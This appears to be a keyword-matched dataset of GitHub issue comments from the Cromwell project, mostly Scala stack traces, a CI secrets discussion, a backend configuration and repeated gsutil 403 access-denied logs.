Security,"okay, that works for me! To answer your questions about CircleCI:. - environment variables used in the project are [encrypted](https://circleci.com/docs/2.0/security/#encryption) also using hashicorp vault! So, same thing or if not very similar deal as what you have.; - once you set them in the interface, you can't change or see them; - if the environment variables aren't set in the container with ENV or as flags with --env then they won't be saved. You would likely want to have them be [ARGS](https://vsupalov.com/docker-arg-env-variable-guide/) instead to be used and available in the container during build, but then not persisted in the container. So, as long as:; - you set secrets in the project and not the circle.yml; - you don't allow the CI to pass on secrets to other forked build requests (you would have to turn it on in settings are there are a lot of **warning don't do this!** prompts before you get there and; - you use ARGS to expose needed variables from the environment to the container for building (that don't get saved). . I think you'd be ok :) But sure, I'm definitely not a security expert. Anyway, since it's a single file, please feel free to grab the commit from here if/when you are ready.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110:116,encrypt,encrypted,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110,12,"['encrypt', 'expose', 'hash', 'secur']","['encrypted', 'encryption', 'expose', 'hashicorp', 'security']"
Security,om.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$9(WdlDraft2WomScatterNodeMaker.scala:55); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$7(WdlDraft2WomScatterNodeMaker.scala:52); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:51); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:15); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode$(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$ops$$anon$1.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:90); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:4316,validat,validation,4316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,on during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.scala:11); at cromwell.backend.impl.jes.JesWorkflowPaths.toJesCallPaths(JesWorkflowPaths.scala:42); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPaths$lzycompute(JesAsyncBackendJobExecutionActor.scala:108); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.jesCallPaths(JesAsyncBackendJobExecutionActor.scala:108); at cromwell.backend.impl.jes.JesAsyncBackendJobExe,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1582,validat,validateCredentials,1582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['validat'],['validateCredentials']
Security,on$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(Traverse.scala:19); 	at cats.Traverse$Ops.traverse$(Traverse.scala:19); 	at cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); 	at cromwell.core.path.PathBuilderFactory$.instantiatePathBuilders(PathBuilderFactory.scala:23); 	at cromwell.engine.EngineFilesystems$.pathBuildersForWorkflow(EngineFilesystems.scala:29); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$workflowOptionsAndPathBuilders$1(MaterializeWorkflowDescriptorActor.scala:226); 	at cats.data.Validated.map(Validated.scala:204); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowOptionsAndPathBuilders(MaterializeWorkflowDescriptorActor.scala:225); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:159); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:155); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.processEvent(FSM.scala:684); 	at akka.actor.FSM.processEvent$(FSM.scala:681); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:136); 	at akka.actor.LoggingFSM.processEvent(FSM.scal,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:3504,Validat,Validated,3504,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['Validat'],['Validated']
Security,orCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.servi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4006,Hash,HashMap,4006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,"orage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default"". // Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; // There is no logic to determine if the error was transient or not, everything is retried upon failure; // Defaults to 3; localization-attempts = 3; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""xxx""; }; }; }; }; }; }; ```. I then run with th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:2136,access,access,2136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,2,['access'],['access']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3700,Access,AccessDeniedException,3700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4954,Access,AccessDeniedException,4954,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6208,Access,AccessDeniedException,6208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7462,Access,AccessDeniedException,7462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8716,Access,AccessDeniedException,8716,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9970,Access,AccessDeniedException,9970,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11224,Access,AccessDeniedException,11224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to 